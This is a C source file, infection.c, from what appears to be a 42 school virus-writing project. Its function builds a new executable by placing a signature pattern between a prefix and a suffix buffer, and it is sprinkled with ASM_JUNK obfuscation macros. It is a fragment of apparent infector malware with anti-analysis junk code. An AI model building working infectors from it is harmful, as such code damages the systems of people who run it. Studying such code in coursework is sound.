/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

int			pack_executables(char **result, char *prefix, int prefix_len, char *suffix, int suffix_len)
{
	char	pattern[] = { PATTERN };
	int		total_len = prefix_len + suffix_len + sizeof(pattern);
	char	*new_exe = NULL;

	if ((new_exe = (char *)malloc(sizeof(char) * total_len)) == NULL)
		return 0;
	memcpy(new_exe									, prefix		, prefix_len);
	memcpy(new_exe + prefix_len						, (char*)pattern, sizeof(pattern));
	memcpy(new_exe + prefix_len + sizeof(pattern)	, suffix		, suffix_len);			ASM_JUNK;
	*result = new_exe;																		ASM_JUNK;
	return (total_len);
}
